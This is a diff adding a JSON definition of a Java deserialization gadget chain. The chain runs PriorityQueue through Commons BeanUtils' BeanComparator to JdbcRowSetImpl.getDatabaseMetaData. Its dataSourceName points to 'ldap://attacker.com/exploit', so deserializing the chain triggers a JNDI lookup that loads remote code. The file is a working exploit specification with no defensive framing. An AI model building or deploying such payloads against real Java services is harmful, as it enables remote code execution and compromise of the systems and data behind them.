@@ -1,0 +1,25 @@
+{
+  "chain_type": "CB_JNDI - JdbcRowSetImpl.getDatabaseMetaData() JNDI via PriorityQueue",
+  "root_class": "java.util.PriorityQueue",
+  "root_trigger": "readObject->heapify->siftDown->comparator.compare",
+  "links": [
+    {
+      "class": "org.apache.commons.beanutils.BeanComparator",
+      "field_overrides": {
+        "property": "databaseMetaData",
+        "comparator": {"$ref": "link:1"}
+      }
+    },
+    {
+      "class": "java.util.Collections$ReverseComparator",
+      "field_overrides": {}
+    },
+    {
+      "class": "com.sun.rowset.JdbcRowSetImpl",
+      "field_overrides": {
+        "dataSourceName": "ldap://attacker.com/exploit"
+      }
+    }
+  ],
+  "sink_method": "JdbcRowSetImpl.getDatabaseMetaData"
+}
